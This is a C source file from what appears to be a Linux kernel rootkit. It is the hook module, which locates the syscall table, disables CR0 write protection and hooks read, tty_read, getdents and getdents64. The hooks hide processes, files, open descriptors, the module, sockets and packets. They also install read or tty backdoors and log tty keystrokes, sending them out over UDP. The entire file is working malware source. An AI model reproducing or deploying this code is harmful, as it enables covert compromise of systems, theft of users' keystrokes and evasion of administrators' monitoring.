#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/xattr.h>
#include <linux/fdtable.h>
#include <linux/list.h>
#include <linux/proc_ns.h>
#include <linux/namei.h>
#include <linux/file.h>
#include <linux/sched.h>
#include <linux/fs_struct.h>
#include <linux/dcache.h>

#include "common.h"
#include "hook.h"
#include "rootkit.h"
#include "modhide.h"
#include "filehide.h"
#include "backdoor.h"
#include "pidhide.h"
#include "openhide.h"
#include "read.h"
#include "inputlog.h"
#include "sockhide.h"
#include "packhide.h"
#include "porthide.h"

extern rootkit_t rootkit;

void **sys_calls;

atomic_t read_install_count;
atomic_t getdents_install_count;
atomic_t tty_read_install_count;
atomic_t packet_rcv_install_count;

atomic_t read_count;
atomic_t getdents_count;
atomic_t getdents64_count;
atomic_t tty_read_count;
atomic_t packet_rcv_count;

asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
asmlinkage long (*sys_getdents)(const struct pt_regs *);
asmlinkage long (*sys_getdents64)(const struct pt_regs *);
ssize_t (*sys_tty_read)(struct file *, char *, size_t, loff_t *);

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

int
retrieve_sys_call_table(void)
{
    return NULL == (sys_calls
        = (void **)kallsyms_lookup_name("sys_call_table"));
}

void
init_hooks(void)
{
    atomic_set(&read_install_count, 0);
    atomic_set(&tty_read_install_count, 0);
    atomic_set(&getdents_install_count, 0);
    atomic_set(&packet_rcv_install_count, 0);

    atomic_set(&read_count, 0);
    atomic_set(&tty_read_count, 0);
    atomic_set(&getdents_count, 0);
    atomic_set(&getdents64_count, 0);
    atomic_set(&packet_rcv_count, 0);

    sys_read = (void *)sys_calls[__NR_read];
    sys_getdents = (void *)sys_calls[__NR_getdents];
    sys_getdents64 = (void *)sys_calls[__NR_getdents64];
    sys_tty_read = NULL;

    if (rootkit.hiding_module)
        hide_module();

    if (rootkit.hiding_files)
        hide_files();

    if (rootkit.hiding_open)
        hide_open();

    if (rootkit.hiding_pids)
        hide_pids();

    if (rootkit.hiding_sockets)
        hide_sockets();

    if (rootkit.hiding_packets)
        hide_packets();

    switch (rootkit.backdoor) {
    case BD_READ: backdoor_read(); break;
    case BD_TTY:  backdoor_tty();  break;
    default: break;
    }

    if (rootkit.logging_input)
        log_input("127.0.0.1", "5000");
}

void
remove_hooks(void)
{
    if (rootkit.hiding_module)
        unhide_module();

    if (rootkit.hiding_files)
        unhide_files();

    if (rootkit.hiding_open)
        unhide_open();

    if (rootkit.hiding_pids) {
        clear_hidden_pids();
        unhide_pids();
    }

    if (rootkit.hiding_sockets)
        unhide_sockets();

    if (rootkit.hiding_packets)
        unhide_packets();

    if (rootkit.backdoor != BD_OFF)
        unbackdoor();

    if (rootkit.logging_input)
        unlog_input();
}

void
disable_protection(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

void
enable_protection(void)
{
    write_cr0(read_cr0() | 0x10000);
}


asmlinkage ssize_t
g7_read(const struct pt_regs *pt_regs)
{
    atomic_inc(&read_count);
    long ret = sys_read(pt_regs);

    // Just like the SystemV-CC (ignoring fd)
    char *buf = (char *)pt_regs->si;
    size_t count = pt_regs->dx;

    if (rootkit.backdoor == BD_READ)
        handle_pid(current->pid, buf, count);

    atomic_dec(&read_count);
    return ret;
}

ssize_t
g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
{
    atomic_inc(&tty_read_count);
    ssize_t ret = sys_tty_read(file, buf, count, off);

    // pull buffer into kernel space
    char *kbuf = (char *)kmalloc(count, GFP_KERNEL);
    copy_from_user(kbuf, buf, count);

    if (rootkit.backdoor == BD_TTY)
        handle_pid(current->pid, buf, count);

    if (rootkit.logging_input)
        send_udp(current->pid, file, kbuf, count);

    kfree(kbuf);
    atomic_dec(&tty_read_count);
    return ret;
}

// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent *dirent_t_ptr;

    bool may_proc;
    unsigned long offset;
    dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent_t_ptr dirent = (dirent_t_ptr)pt_regs->si;
    long ret = sys_getdents(pt_regs);

    bool is_fd = 0; // We only need /proc/[pid]/fd dirs
    struct file *dirfile = fget(fd);
    pid_t fd_pid;

    if (ret <= 0 || !(kdirent = (dirent_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    atomic_inc(&getdents_count);

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
    may_proc = rootkit.hiding_pids && kdirent_dentry->d_inode->i_ino == PROC_ROOT_INO;

    inode_list_t hidden_inodes = { 0, NULL };
    inode_list_t_ptr hi_head, hi_tail;
    hi_head = hi_tail = &hidden_inodes;

    if (rootkit.hiding_files) {
        struct list_head *i;
        list_for_each(i, &kdirent_dentry->d_subdirs) {
            unsigned long inode;
            struct dentry *child = list_entry(i, struct dentry, d_child);

            if ((inode = must_hide_inode(child)))
                hi_tail = add_inode_to_list(hi_tail, inode);
        }
    }

    if(rootkit.hiding_open && (fd_pid = may_fd(dirfile))) {
        is_fd = 1;
        fill_fds(fd_pid);
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);

        if ((may_proc && list_contains_pid(&hidden_pids, PID_FROM_NAME(cur_kdirent->d_name)))
            || list_contains_inode(hi_head, cur_kdirent->d_ino)
            || list_contains_fd(&hidden_fds, FD_FROM_NAME(cur_kdirent->d_name)))
        {
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);
    atomic_dec(&getdents_count);

yield:
    clear_hidden_fds();
    kfree(kdirent);
    return ret;
}

// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents64(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent64 *dirent64_t_ptr;

    bool may_proc;
    unsigned long offset;
    dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
    long ret = sys_getdents64(pt_regs);

    bool is_fd = 0; // We only need /proc/[pid]/fd dirs
    struct file *dirfile = fget(fd);
    pid_t fd_pid;

    if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    atomic_inc(&getdents64_count);

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
    may_proc = rootkit.hiding_pids && kdirent_dentry->d_inode->i_ino == PROC_ROOT_INO;

    inode_list_t hidden_inodes = { 0, NULL };
    inode_list_t_ptr hi_head, hi_tail;
    hi_head = hi_tail = &hidden_inodes;

    if (rootkit.hiding_files) {
        struct list_head *i;
        list_for_each(i, &kdirent_dentry->d_subdirs) {
            unsigned long inode;
            struct dentry *child = list_entry(i, struct dentry, d_child);

            if ((inode = must_hide_inode(child)))
                hi_tail = add_inode_to_list(hi_tail, inode);
        }
    }

    if(rootkit.hiding_open && (fd_pid = may_fd(dirfile))) {
        is_fd = 1;
        fill_fds(fd_pid);
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);

        if ((may_proc && list_contains_pid(&hidden_pids, PID_FROM_NAME(cur_kdirent->d_name)))
            || list_contains_inode(hi_head, cur_kdirent->d_ino)
            || list_contains_fd(&hidden_fds, FD_FROM_NAME(cur_kdirent->d_name)))
        {
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);
    atomic_dec(&getdents64_count);

yield:
    clear_hidden_fds();
    kfree(kdirent);
    return ret;
}
